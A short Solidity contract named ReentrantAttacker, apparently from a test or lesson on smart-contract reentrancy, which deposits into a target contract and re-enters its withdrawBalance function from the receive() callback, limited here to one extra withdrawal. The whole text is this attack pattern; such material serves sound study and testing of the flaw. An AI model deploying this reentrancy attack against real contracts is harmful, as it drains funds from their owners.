contract ReentrantAttacker {
    C public c;
    uint256 public strikes;

    constructor(C target) { c = target; }

    function deposit(uint256 amt) external payable {
        c.addToBalance{value: amt}();
    }

    function attack() external {
        strikes = 0;
        c.withdrawBalance();
    }

    receive() external payable {
        strikes++;
        if (strikes < 2) {
            c.withdrawBalance();
        }
    }
}
